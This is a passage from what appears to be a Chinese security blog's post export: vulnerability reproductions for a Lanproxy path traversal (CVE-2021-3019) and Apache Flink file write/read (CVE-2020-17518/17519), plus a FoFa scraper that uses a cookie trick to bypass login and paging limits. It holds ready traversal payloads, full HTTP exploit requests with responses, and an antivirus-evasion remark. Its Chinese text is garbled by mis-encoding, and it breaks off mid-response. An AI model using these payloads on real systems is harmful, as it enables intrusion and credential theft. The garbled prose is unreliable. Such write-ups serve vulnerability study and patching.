<p>è¯¥æ–¹æ³•åœ¨360æ€æ¯’çš„7ç‰ˆæœ¬æ²¡äº‹ï¼Œä½†æ˜¯åœ¨5ç‰ˆæœ¬ç»™å¹²æ‰äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>å…æ€</tag>
      </tags>
  </entry>
  <entry>
    <title>Lanproxyä»»æ„æ–‡ä»¶è¯»å–(CVE-2021-3019)</title>
    <url>/posts/e603ef6a/</url>
    <content><![CDATA[<p>Lanproxyæ˜¯ffayä¸ªäººå¼€å‘è€…çš„ä¸€ä¸ªå¯å°†å±€åŸŸç½‘å†…æœåŠ¡ä»£ç†åˆ°å…¬ç½‘çš„å†…ç½‘ç©¿é€å·¥å…·ã€‚è¢«çˆ†å‡ºä»»æ„æ–‡ä»¶è¯»å–ã€‚ã€‚</p>
<a id="more"></a>

<h1 id="CVE-2021-3019ï¼šLanproxyä»»æ„æ–‡ä»¶è¯»å–"><a href="#CVE-2021-3019ï¼šLanproxyä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="CVE-2021-3019ï¼šLanproxyä»»æ„æ–‡ä»¶è¯»å–"></a>CVE-2021-3019ï¼šLanproxyä»»æ„æ–‡ä»¶è¯»å–</h1><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>Lanproxy 0.1 å­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸ç›®å½•éå†è¯»å–/../conf/config.propertiesæ¥è·å–åˆ°å†…éƒ¨ç½‘è¿æ¥çš„å‡­æ®ã€‚</p>
<p><img src="/posts/e603ef6a/image-20210119092212627.png" alt="image-20210119092212627"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è®¿é—®æœåŠ¡é¡µé¢ç®¡ç†åœ°å€ï¼ŒæŠ“åŒ…</span><br><span class="line">åˆ©ç”¨ ../è¿›è¡Œè·¯å¾„éå†è¯»å–æ–‡ä»¶</span><br><span class="line">ä¾‹å¦‚ ../conf/config.properties</span><br></pre></td></tr></table></figure>



<p><img src="/posts/e603ef6a/image-20210119092022356.png" alt="image-20210119092022356"></p>
<h2 id="ä¿®å¤æ–¹å¼"><a href="#ä¿®å¤æ–¹å¼" class="headerlink" title="ä¿®å¤æ–¹å¼"></a>ä¿®å¤æ–¹å¼</h2><p>ç›®å‰å‚å•†å·²å‘å¸ƒå‡çº§è¡¥ä¸ä»¥ä¿®å¤æ¼æ´ï¼Œè¡¥ä¸è·å–é“¾æ¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/ffay/lanproxy/commits/master</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>ä»£ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>FoFaè„šæœ¬</title>
    <url>/posts/f2b0d565/</url>
    <content><![CDATA[<p>FoFaçˆ¬è™«ï¼Œä¸»è¦æ˜¯æ²¡æœ‰ç±³ï¼ŒAPIçš„ä¸åˆé€‚ã€‚æ–‡ç« å†…æœ‰æ²¡ç±³çš„å¯ç™½å«–ä¸€ç§æ–¹æ³•ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚æ— éœ€ä¼šå‘˜ä¸€ä¸‡æ¡ã€‚ã€‚</p>
<a id="more"></a>

<h1 id="FoFaçš„å‹¤åŠ³è„šæœ¬"><a href="#FoFaçš„å‹¤åŠ³è„šæœ¬" class="headerlink" title="FoFaçš„å‹¤åŠ³è„šæœ¬"></a>FoFaçš„å‹¤åŠ³è„šæœ¬</h1><p><strong>å³ä¾¿åªæœ‰äº”é¡µï¼Œè¿˜æ˜¯æƒ³åšä¸ªçˆ¬è™«ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</strong></p>
<p>ç®€è¿°ï¼šæ²¡ç±³ï¼Œåˆå‘ç°å¤§éƒ½æ˜¯åŸºäºAPIæŸ¥è¯¢çš„ï¼Œå› ä¸ºæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„è„šæœ¬ï¼Œæ‰€ä»¥è‡ªå·±å†™äº†ä¸€ä¸‹ã€‚å‘è¡¨ä¹‹å‰åœ¨è®ºå›æœäº†æœï¼Œå‘ç°äº†ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œå¯ç™½å«–FoFaã€‚ã€‚ã€‚<span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3RocmVhZC01OTMzNi0xLTQuaHRtbA==">https://www.t00ls.net/thread-59336-1-4.html<i class="fa fa-external-link-alt"></i></span><br>è™½ç„¶ä»–æå‰å†™å¥½äº†ï¼Œemm ,ä¸è¿‡æˆ‘è¿˜æ˜¯è‡ªå·±æ¥å§ã€‚</p>
<ul>
<li>è·å–URLã€IPã€IPLocalã€Serverã€TITLEï¼Œå¹¶è¿›è¡Œæ ‡å·ID</li>
<li>æ ¹æ®è®ºå›ä¸­è€å“¥çš„æ–¹æ³•ï¼Œä½¿ç”¨Cookieä¸­<code>result_per_page=N</code>æ¥ç™½å«–Næ¡ï¼ˆN&lt;10000ï¼‰ã€‚</li>
<li>ä¸ºäº†ä¸è§¦å‘åçˆ¬æœºåˆ¶ï¼Œæ¯çˆ¬å–1é¡µï¼Œsleep 1s;çˆ¬å–3é¡µï¼Œå†sleep  3sã€‚</li>
</ul>
<p>å¯ä½¿ç”¨<code>python3  fofa_search.py 10 &quot;baidu.com&quot; &quot;_fofapro_ars_session=xx&quot; | tee  x.txt</code> æ¥è¾¹è¾“å‡ºè¾¹ä¿å­˜</p>
<p>BUGï¼šå°è¯•äº†æ¯æ¬¡æŒ‡å®šä¸€é¡µ2000æ¡æ•°æ®æ—¶ï¼Œä¼šæœ‰éƒ¨åˆ†æ— æ³•åŒ¹é…å‡ºæ¥- - (é»˜è®¤Cookieä¸­result_per_pageè®¾ç½®äº†2000ï¼Œå¦‚æœè¯¥æ–¹æ³•å¤±æ•ˆï¼Œç›´æ¥åˆ é™¤ï¼Œåªä¿ç•™cookieå˜é‡å³å¯ã€‚)</p>
<h2 id="Nday"><a href="#Nday" class="headerlink" title="Nday"></a>Nday</h2><ol>
<li>ä½¿ç”¨Cookieä¸­result_per_page=Næ¥ç™½å«–Næ¡ï¼ˆN&lt;10000ï¼‰ã€‚</li>
<li>Cookieéšæ„æŒ‡å®šï¼Œå³å¯ï¼Œç®—æ˜¯æœªæˆæƒã€‚ï¼ˆ_fofapro_ars_session=aï¼‰å³å¯ç»•è¿‡ç™»é™†é™åˆ¶</li>
</ol>
<p><img src="/posts/f2b0d565/87391610965447_.pic_hd.jpg" alt="87391610965447_.pic_hd"></p>
<h2 id="æ­£å¸¸ç¤ºä¾‹ï¼š"><a href="#æ­£å¸¸ç¤ºä¾‹ï¼š" class="headerlink" title="æ­£å¸¸ç¤ºä¾‹ï¼š"></a>æ­£å¸¸ç¤ºä¾‹ï¼š</h2><p><img src="/posts/f2b0d565/c.png" alt="c"></p>
<p><img src="/posts/f2b0d565/d.png" alt="d"></p>
<p><img src="/posts/f2b0d565/e.png" alt="e"></p>
<h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># auth: oudeniu</span></span><br><span class="line"><span class="comment"># time: 2020-1-18</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fofa</span>(<span class="params">num,url,cookie</span>):</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;https://fofa.so/result?qbase64=&#x27;</span> + base64.b64encode(url.encode()).decode()</span><br><span class="line">    print(<span class="string">&#x27;[URL]: &#x27;</span> + url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:cookie + <span class="string">&#x27;;result_per_page=2100&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    id = <span class="number">1</span> <span class="comment"># é¡ºåºè¾“å‡ºï¼Œç»Ÿè®¡å¤šå°‘ä¸ª</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>,int(num)+<span class="number">1</span>):</span><br><span class="line">            <span class="comment"># æ¯çˆ¬å–1é¡µï¼Œsleep 1s;æ¯çˆ¬å–3é¡µï¼Œåˆ™sleep  3s; ####å¯è§†æƒ…å†µè€Œå®šï¼Œå¤ªå¿«ä¼šè§¦å‘åçˆ¬æœºåˆ¶ã€‚</span></span><br><span class="line">            <span class="keyword">if</span> int(page)%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                time.sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="comment"># print(url + &#x27;&amp;page=&#x27; + str(page))</span></span><br><span class="line">            html = requests.get(url + <span class="string">&#x27;&amp;page=&#x27;</span> + str(page),headers=headers,timeout=<span class="number">15</span>).text</span><br><span class="line">            <span class="comment"># ä¿å­˜æºç ï¼Œæœ¬åœ°åˆ†æ</span></span><br><span class="line">            <span class="comment"># with open(str(id)+&#x27;.txt&#x27;,&#x27;w&#x27;)as f:</span></span><br><span class="line">            <span class="comment">#     f.write(html)</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="comment"># print(html)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;æ™®é€šç”¨æˆ·åªèƒ½ç¿»5é¡µ&quot;</span> <span class="keyword">in</span> html:</span><br><span class="line">                exit(<span class="string">&quot;[Error]: æ™®é€šç”¨æˆ·åªèƒ½ç¿»5é¡µ!!!&quot;</span>)</span><br><span class="line">            <span class="comment"># print(html)</span></span><br><span class="line">            </span><br><span class="line">                <span class="comment"># ç¬¬ä¸€æ¬¡æ­£åˆ™ï¼Œé—®é¢˜ï¼šæœ‰çš„æ²¡æœ‰title,</span></span><br><span class="line">                <span class="comment"># result = re.findall(r&#x27;&lt;div class=&quot;re-domain&quot;&gt;.*?&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&gt;.*?&lt;div class=&quot;time&quot;&gt;(.*?)&lt;/div&gt;.*?&lt;div&gt;&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&lt;/div&gt;.*?&lt;img class=&quot;nation-icon&quot; src=&quot;.*?&lt;a class=.*?&quot;&gt;(.*?)&lt;/a&gt;.*?&lt;div class=&quot;com-tag-wrap clearfix&quot;&gt;.*?class=&quot;f-tags-com&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;,html, re.S)</span></span><br><span class="line">                <span class="comment"># print(result)</span></span><br><span class="line">                <span class="comment"># ç¬¬äºŒæ¬¡æ­£åˆ™ï¼Œåˆ†å¼€title, é—®é¢˜ï¼šæœ‰çš„æ²¡æœ‰æœåŠ¡</span></span><br><span class="line">                <span class="comment"># res = re.findall(r&#x27;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&gt;.*?&lt;div&gt;&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&lt;/div&gt;.*?&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;.*?class=&quot;f-tags-com&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;,html,re.S)</span></span><br><span class="line">                <span class="comment"># title = re.findall(r&#x27; &lt;!-- ç½‘ç«™æ ‡é¢˜ --&gt;.*?&lt;div class=&quot;time&quot;&gt;(.*?)&lt;/div&gt;&#x27;,html,re.S)</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ç¬¬ä¸‰æ¬¡æ­£åˆ™ï¼Œåˆ†å¼€titleå’Œserver   å¯è¡Œ OK</span></span><br><span class="line">            res = re.findall(<span class="string">r&#x27;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&gt;.*?&lt;div&gt;&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&lt;/div&gt;.*?&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,html,re.S)</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                title = re.findall(<span class="string">r&#x27;&lt;!-- ç½‘ç«™æ ‡é¢˜ --&gt;.*?&lt;div class=&quot;time&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>,html,re.S)</span><br><span class="line">                </span><br><span class="line">                server = re.findall(<span class="string">r&#x27;&lt;!-- ç½‘ç«™ç´¢å¼•åŒ…å«server --&gt;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,html,re.S)</span><br><span class="line">                <span class="comment"># print(re.sub(r&#x27;&lt;.*&gt;&#x27;,&#x27;&#x27;,i))</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> i,t <span class="keyword">in</span> enumerate(title):</span><br><span class="line">                    s = re.sub(<span class="string">r&#x27;&lt;.*&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,server[i].strip())</span><br><span class="line">                    <span class="comment"># æ²¡æœ‰titleæ—¶ï¼Œä¼šåŒ¹é…åˆ°ä¸€ä¸²å­—ç¬¦ï¼Œå…³é”®å­—ä¸ºï¼šASN  second</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;ASN&#x27;</span> <span class="keyword">in</span> t <span class="keyword">or</span> <span class="string">&#x27;second&#x27;</span> <span class="keyword">in</span> t:</span><br><span class="line">                        <span class="comment"># æ²¡æœ‰serveræ—¶ï¼Œä¼šåŒ¹é…åˆ°ä¸€ä¸²å­—ç¬¦ï¼Œå°†å…¶ä¸­å…³é”®å†…å®¹æ›¿æ¢æ‰ï¼Œå°±ä¸ºç©ºï¼Œç„¶åéœ€è¦æ›¿æ¢æ‰\n,</span></span><br><span class="line">                        <span class="keyword">if</span> s:</span><br><span class="line">                            print(str(id).center(<span class="number">5</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">0</span>].strip().ljust(<span class="number">30</span>)  + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">1</span>].ljust(<span class="number">15</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">2</span>][:<span class="number">4</span>].center(<span class="number">10</span>) + <span class="string">&#x27; | &#x27;</span> + s.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).strip()[:<span class="number">20</span>].ljust(<span class="number">20</span>)+ <span class="string">&#x27; | &#x27;</span> + <span class="string">&#x27;NULL&#x27;</span>.ljust(<span class="number">20</span>))</span><br><span class="line">                            id = id+<span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:                   </span><br><span class="line">                            print(str(id).center(<span class="number">5</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">0</span>].strip().ljust(<span class="number">30</span>)  + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">1</span>].ljust(<span class="number">15</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">2</span>][:<span class="number">4</span>].center(<span class="number">10</span>) + <span class="string">&#x27; | &#x27;</span> + <span class="string">&#x27;NULL&#x27;</span>.ljust(<span class="number">20</span>)+ <span class="string">&#x27; | &#x27;</span> + <span class="string">&#x27;NULL&#x27;</span>.ljust(<span class="number">20</span>))</span><br><span class="line">                            id = id+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> s:</span><br><span class="line">                            print(str(id).center(<span class="number">5</span>) + <span class="string">&#x27; | &#x27;</span>  + res[i][<span class="number">0</span>].strip().ljust(<span class="number">30</span>)  + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">1</span>].ljust(<span class="number">15</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">2</span>][:<span class="number">4</span>].center(<span class="number">10</span>-len(res[i][<span class="number">2</span>][:<span class="number">4</span>])) + <span class="string">&#x27; | &#x27;</span> + s.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).strip()[:<span class="number">20</span>].ljust(<span class="number">20</span>) + <span class="string">&#x27; | &#x27;</span> + t[:<span class="number">20</span>].ljust(<span class="number">20</span>))</span><br><span class="line">                            id = id +<span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            print(str(id).center(<span class="number">5</span>) + <span class="string">&#x27; | &#x27;</span>  + res[i][<span class="number">0</span>].strip().ljust(<span class="number">30</span>)  + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">1</span>].ljust(<span class="number">15</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">2</span>][:<span class="number">4</span>].center(<span class="number">10</span>-len(res[i][<span class="number">2</span>][:<span class="number">4</span>])) + <span class="string">&#x27; | &#x27;</span> + <span class="string">&#x27;NULL&#x27;</span>.ljust(<span class="number">20</span>) + <span class="string">&#x27; | &#x27;</span> + t[:<span class="number">20</span>].ljust(<span class="number">20</span>))</span><br><span class="line">                            id = id +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exit(<span class="string">&quot;[NULL]: over NO result!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        exit(<span class="string">&quot;[Error] &quot;</span> + str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    baner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string">_____________________________________</span></span><br><span class="line"><span class="string">s ___           ___        ___       |</span></span><br><span class="line"><span class="string">s(  _`\        (  _`\     (  _`\     |</span></span><br><span class="line"><span class="string">s| |_) ) _   _ | (_(_)_   | (_(_)_ _ |</span></span><br><span class="line"><span class="string">s| ,__/&#x27;( ) ( )|  _)/&#x27;_`\ |  _)/&#x27;_` )|</span></span><br><span class="line"><span class="string">s| |    | (_) || | ( (_) )| | ( (_| ||</span></span><br><span class="line"><span class="string">s(_)    `\__, |(_) `\___/&#x27;(_) `\__,_)|</span></span><br><span class="line"><span class="string">s       ( )_| |                      |</span></span><br><span class="line"><span class="string">s       `\___/&#x27;                      |</span></span><br><span class="line"><span class="string">s                    time:2021-1-18  |</span></span><br><span class="line"><span class="string">-----------+++++++++++++-------------</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    print(baner)</span><br><span class="line">    num = url = cookie= <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        args = sys.argv[<span class="number">1</span>:<span class="number">4</span>]</span><br><span class="line">        num = args[<span class="number">0</span>]</span><br><span class="line">        url = args[<span class="number">1</span>]</span><br><span class="line">        cookie = args[<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(args)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="string">&#x27;[Eg]: python3 fofa_search.py &lt;PagesNum&gt; &lt;SearchInfo&gt; &lt;Cookie&gt;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;python3 fofa_search.py 3 \&quot;ç™¾åº¦\&quot; \&quot;session=asasa\&quot;&#x27;</span>)</span><br><span class="line">    get_fofa(num,url,cookie)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>FoFa</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Flink ä»»æ„æ–‡ä»¶å†™å…¥/è¯»å–</title>
    <url>/posts/87dcd60b/</url>
    <content><![CDATA[<p>Flinkæ ¸å¿ƒæ˜¯ä¸€ä¸ªæµå¼çš„æ•°æ®æµæ‰§è¡Œå¼•æ“ï¼Œå…¶é’ˆå¯¹æ•°æ®æµçš„åˆ†å¸ƒå¼è®¡ç®—æä¾›äº†æ•°æ®åˆ†å¸ƒã€æ•°æ®é€šä¿¡ä»¥åŠå®¹é”™æœºåˆ¶ç­‰åŠŸèƒ½ã€‚Flink 1.5.1å¼•å…¥äº†REST APIï¼Œä½†å…¶å®ç°ä¸Šå­˜åœ¨å¤šå¤„ç¼ºé™·ï¼Œå¯¼è‡´ç›®å½•éå†å’Œä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼Œé£é™©è¾ƒå¤§ã€‚</p>
<a id="more"></a>

<h1 id="æ¼æ´ç¼–å·"><a href="#æ¼æ´ç¼–å·" class="headerlink" title="æ¼æ´ç¼–å·"></a>æ¼æ´ç¼–å·</h1><ul>
<li>CVE-2020-17519ï¼šæ”»å‡»è€…å¯é€šè¿‡REST APIä½¿ç”¨â€¦/è·³ç›®å½•å®ç°ç³»ç»Ÿä»»æ„æ–‡ä»¶è¯»å–ï¼›</li>
<li>CVE-2020-17518ï¼šé€šè¿‡æ„é€ æ¶æ„çš„http headerï¼Œå¯å®ç°è¿œç¨‹æ–‡ä»¶å†™å…¥ã€‚</li>
</ul>
<h1 id="CVE-2020-17518-Apache-Flinkä»»æ„æ–‡ä»¶å†™å…¥"><a href="#CVE-2020-17518-Apache-Flinkä»»æ„æ–‡ä»¶å†™å…¥" class="headerlink" title="CVE-2020-17518(Apache Flinkä»»æ„æ–‡ä»¶å†™å…¥)"></a>CVE-2020-17518(Apache Flinkä»»æ„æ–‡ä»¶å†™å…¥)</h1><p>å‚è€ƒï¼š<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJNE16Y3dOVEF6T1E9PSZhbXA7bWlkPTIyNDc0ODk1ODEmYW1wO2lkeD0xJmFtcDtzbj0xMmM5Nzk3YTNjM2U0MjNiYTI4MjdkZDdhYWUyNTBiZCZhbXA7Y2hrc209ZWI4N2YzOGRkY2YwN2E5YjZkYjNiODcxMDU5NjExNmExMjRmNzBiN2QwZTFjOTZkYjVkMGE2ZTk4ZWYyNmM3N2QyYWM1ZWQxMzMzNyZhbXA7c2NlbmU9MCZhbXA7eHRyYWNrPTEjcmQ=">https://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&amp;mid=2247489581&amp;idx=1&amp;sn=12c9797a3c3e423ba2827dd7aae250bd&amp;chksm=eb87f38ddcf07a9b6db3b8710596116a124f70b7d0e1c96db5d0a6e98ef26c77d2ac5ed13337&amp;scene=0&amp;xtrack=1#rd<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>1.5.1-1.11.2</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>é¦–å…ˆå°±è€ƒè™‘ä¸Šä¼ jspä¸€å¥è¯åˆ°Webç›®å½•ï¼Œä½†æ˜¯Webç›®å½•ä¸‹å¹¶ä¸èƒ½å¤Ÿè§£æjspè„šæœ¬ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------277556350534634793532534114427</span><br><span class="line">Content-Length: 315</span><br><span class="line">Origin: http://localhost:8081</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:8081/</span><br><span class="line">Cookie: Idea-ebfc5b99=abcb5f88-d377-4462-9749-1fb24350d578</span><br><span class="line"></span><br><span class="line">-----------------------------277556350534634793532534114427</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;jarfile&quot;</span>; filename=<span class="string">&quot;../../../../../../../tmp/name.txt&quot;</span></span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">liuwei</span><br><span class="line">wangjing</span><br><span class="line">wangyan</span><br><span class="line">wangfei</span><br><span class="line">zhangling</span><br><span class="line">liting</span><br><span class="line">chenjianhua</span><br><span class="line">xujing</span><br><span class="line">-----------------------------277556350534634793532534114427--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/87dcd60b/image-20210108164027108.png" alt="image-20210108164027108"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h4 id="è·å–è·¯å¾„"><a href="#è·å–è·¯å¾„" class="headerlink" title="è·å–è·¯å¾„"></a>è·å–è·¯å¾„</h4><p>Flinkè¿è¡Œæ—¶æ–‡ä»¶éƒ½åœ¨/tmpç›®å½•ä¸‹ï¼Œè·¯å¾„ç±»ä¼¼äº<code>/tmp/flink-web-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/</code></p>
<p>æ¯å°æœåŠ¡å™¨è¿è¡ŒFlinkæ—¶è·¯å¾„éƒ½ä¸åŒï¼Œå› æ­¤è¦å…ˆè·å–è¯¥è·¯å¾„ã€‚é€šè¿‡æ¥å£ /jobmanager/config åˆ™å¯ä»¥è·å–web.tmpdirçš„è·¯å¾„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /jobmanager/config HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:8081/</span><br><span class="line">Cookie: Idea-ebfc5b99=abcb5f88-d377-4462-9749-1fb24350d578</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">content-length: 545</span><br><span class="line"></span><br><span class="line">[&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;blob.server.port&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;6124&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;taskmanager.memory.process.size&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1728m&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;parallelism.default&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;jobmanager.execution.failover-strategy&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;region&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;jobmanager.rpc.address&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;b8bcd8765a65&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;taskmanager.numberOfTaskSlots&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,&#123;<span 